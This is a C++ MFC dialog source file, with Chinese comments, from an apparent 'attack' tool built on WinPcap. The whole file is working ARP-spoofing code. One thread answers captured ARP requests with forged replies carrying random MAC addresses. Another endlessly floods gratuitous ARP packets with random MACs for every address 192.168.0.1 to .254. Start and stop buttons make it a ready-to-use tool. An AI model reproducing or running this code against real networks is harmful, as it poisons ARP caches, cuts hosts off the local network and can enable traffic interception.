// ProcessAttackDlg.cpp : 实现文件
//

#include "stdafx.h"
#include "attack.h"
#include "ProcessAttackDlg.h"


// CProcessAttackDlg 对话框

IMPLEMENT_DYNAMIC(CProcessAttackDlg, CDialog)

CProcessAttackDlg::CProcessAttackDlg(string netCardId,CWnd* pParent /*=NULL*/)
	: m_netCardId(netCardId),m_adhandle(NULL),CDialog(CProcessAttackDlg::IDD, pParent)
{
	m_threadHandle = INVALID_HANDLE_VALUE;
	m_addHandle = INVALID_HANDLE_VALUE;
	m_isRun = false;
	//m_isSuspend = true;
}

CProcessAttackDlg::~CProcessAttackDlg()
{
	//pcap_close(m_adhandle);
	
	//m_isRun = false;
	if(m_isRun)
	{
		m_isRun = false;
	}
	else
	{
		::ResumeThread(m_threadHandle);
		::ResumeThread(m_addHandle);
	}
	if(m_threadHandle != INVALID_HANDLE_VALUE)
	{
		::WaitForSingleObject(m_threadHandle, INFINITE);
		::CloseHandle(m_threadHandle);
		//::SuspendThread(m_threadHandle);
		//::CloseHandle(m_threadHandle);
	}
	
	if(m_addHandle != INVALID_HANDLE_VALUE)
	{
		::WaitForSingleObject(m_addHandle,INFINITE);
		::CloseHandle(m_addHandle);
		//::SuspendThread(m_addHandle);
		//::CloseHandle(m_addHandle);
	}
	
	if(m_adhandle != NULL)
	{
		pcap_close(m_adhandle);
	}
}

void CProcessAttackDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
}


BEGIN_MESSAGE_MAP(CProcessAttackDlg, CDialog)
	ON_BN_CLICKED(IDOK, &CProcessAttackDlg::OnBnClickedOk)
	ON_BN_CLICKED(IDC_BUTTON1, &CProcessAttackDlg::OnBnClickedButton1)
	ON_WM_CLOSE()
	ON_BN_CLICKED(IDCANCEL, &CProcessAttackDlg::OnBnClickedCancel)
END_MESSAGE_MAP()


// CProcessAttackDlg 消息处理程序

BOOL CProcessAttackDlg::OnInitDialog()
{
	CDialog::OnInitDialog();

	// TODO:  在此添加额外的初始化
	char errBuf[PCAP_ERRBUF_SIZE] = {0};
	m_adhandle = pcap_open(m_netCardId.c_str(),65536,PCAP_OPENFLAG_PROMISCUOUS,
							1000,NULL,errBuf);
	if(m_adhandle==NULL)
	{
		return FALSE;
	}
	ifstream in("data.txt");
	string Ip;
	while(in>>Ip)
	{
		m_ipArray.push_back(Ip);
	}
	in.close();
	DWORD id,id1;
	m_threadHandle = ::CreateThread(NULL,0,CProcessAttackDlg::CapturePacketFunc,
						this,CREATE_SUSPENDED,&id);
	m_addHandle    = ::CreateThread(NULL,0,CProcessAttackDlg::SendArpPacket,
						this,CREATE_SUSPENDED,&id1);
	return TRUE;  // return TRUE unless you set the focus to a control
	// 异常: OCX 属性页应返回 FALSE
}

DWORD CProcessAttackDlg::CapturePacketFunc(LPVOID lpParameter)
{
	CProcessAttackDlg *curDlg = (CProcessAttackDlg*)lpParameter;
	int res = 0;
	struct pcap_pkthdr	*header;
	const  u_char		*pkt_data;
	//DataPacket		myPacket;
	while( (res=pcap_next_ex(curDlg->m_adhandle,&header,&pkt_data)) && curDlg->m_isRun)
	{
		if(res==0)
		{
			continue;
		}
		PROTOCOL_TYPE protType = GetProtocolType(pkt_data,header->len);
		if(protType == MXL_ARP)
		{
			unsigned short *opC = (unsigned short*)(pkt_data+20);
			unsigned short opCode = ntohs(*opC);
			if(opCode == 1)
			{
				SendPacket(curDlg->m_adhandle,pkt_data,header->len);
			}else if(opCode == 2)
			{
				//SendArpResponse()
			}
		}
	}
	return 0;
}
void CProcessAttackDlg::OnBnClickedOk()
{
	// TODO: 在此添加控件通知处理程序代码
	if(m_threadHandle != INVALID_HANDLE_VALUE && !m_isRun)
	{
		m_isRun = true;
		//m_isSuspend = false;
		::ResumeThread(m_threadHandle);
		::ResumeThread(m_addHandle);
	}
}

void CProcessAttackDlg::OnBnClickedButton1()
{
	DWORD code;
	// TODO: 在此添加控件通知处理程序代码
	if(m_threadHandle != INVALID_HANDLE_VALUE && m_isRun)
	{
		::SuspendThread(m_threadHandle);
		::SuspendThread(m_addHandle);
		m_isRun = false;
		//m_isSuspend = true;
	}
}

PROTOCOL_TYPE CProcessAttackDlg::GetProtocolType(const u_char *data,int len)
{
	if(len<14)
		return MXL_UNKNOWN_PROTOCOL;
	unsigned short *type = (unsigned short*)(data+12);
	unsigned short realType = ntohs(*type);
	if(realType == 0x0806)
	{
		return MXL_ARP;
	}else if(realType == 0x0805)
	{
		return MXL_RARP;
	}else if(realType == 0x0800)
	{
		if(len<24)
			return MXL_UNKNOWN_PROTOCOL;
		u_char c = data[23];
		if(c==1)
		{
			return MXL_ICMP;
		}else if(c==6)
		{
			return MXL_TCP;
		}else if(c==17)
		{
			return MXL_UDP;
		}
		return MXL_UNKNOWN_PROTOCOL;
	}
	return MXL_UNKNOWN_PROTOCOL;
}

void CProcessAttackDlg::SendPacket(pcap_t *adHanle,const u_char *requestData,int reqLen)
{
	unsigned char sendData[100] = {0};
	if(reqLen < 42)
	{
		return;
	}
	srand(time(NULL));
	memcpy(sendData,requestData+6,6);
	for(int i=0; i<6; i++)
	{
		//免费arp
		if(memcmp(requestData+38,requestData+28,4)==0)
		{
			sendData[i] = 0xff;
		}
		sendData[6+i] = getRand();
	}
	sendData[12] = 0x08;
	sendData[13] = 0x06;
	sendData[14] = 0x00;
	sendData[15] = 0x01;
	sendData[16] = 0x08;
	sendData[17] = 0x00;
	sendData[18] = 0x06;
	sendData[19] = 0x04;
	sendData[20] = 0x00;
	if(memcmp(requestData+38,requestData+28,4) == 0)
	{
		sendData[21] = 0x01;
	}else
	{
		sendData[21] = 0x02;
	}
	memcpy(sendData+22,sendData+6,6);
	memcpy(sendData+28,requestData+38,4);
	memcpy(sendData+32,sendData,6);
	memcpy(sendData+38,requestData+28,4);
	pcap_sendpacket(adHanle,sendData,60);
}	

unsigned char CProcessAttackDlg::getRand()
{
	int value = rand()%256;
	return (unsigned char)value;
}

DWORD CProcessAttackDlg::SendArpPacket(LPVOID lpParameter)
{
	CProcessAttackDlg *curDlg = (CProcessAttackDlg*)lpParameter;
	unsigned char	sendData[100] = {0};
	int i;
	for(i=0; i<6; i++)
	{
		sendData[i] = sendData[32+i] = 0xff;
	}
	sendData[12] = 0x08;
	sendData[13] = 0x06;
	sendData[14] = 0x00;
	sendData[15] = 0x01;

	sendData[16] = 0x08;
	sendData[17] = 0x00;
	
	sendData[18] = 0x06;
	sendData[19] = 0x04;
	
	sendData[20] = 0x00;
	sendData[21] = 0x01;
	srand(time(NULL));
	sendData[28] = 0xc0;
	sendData[29] = 0xa8;
	sendData[30] = 0x00;
	while(1 && curDlg->m_isRun)
	{
		//for(vector<string>::iterator itr = curDlg->m_ipArray.begin(); itr!= curDlg->m_ipArray.end(); itr++)*
		for(unsigned char ip=1; ip<=254; ip++)
		{
			for(i=0; i<6; i++)
			{
				sendData[22+i] = getRand();
			}
			memcpy(sendData+6,sendData+22,6);
			
			sendData[31] = ip;
			//unsigned long ipAddress = inet_addr((*itr).c_str());
			//memcpy(sendData+28,(char*)&ipAddress,4);
			memcpy(sendData+38,sendData+28,4);
			pcap_sendpacket(curDlg->m_adhandle,sendData,60);
			Sleep(10);
		}
	}
	return 0;
}
void CProcessAttackDlg::OnClose()
{
	// TODO: 在此添加消息处理程序代码和/或调用默认值
	CDialog::OnClose();
}

void CProcessAttackDlg::OnBnClickedCancel()
{
	OnCancel();
}
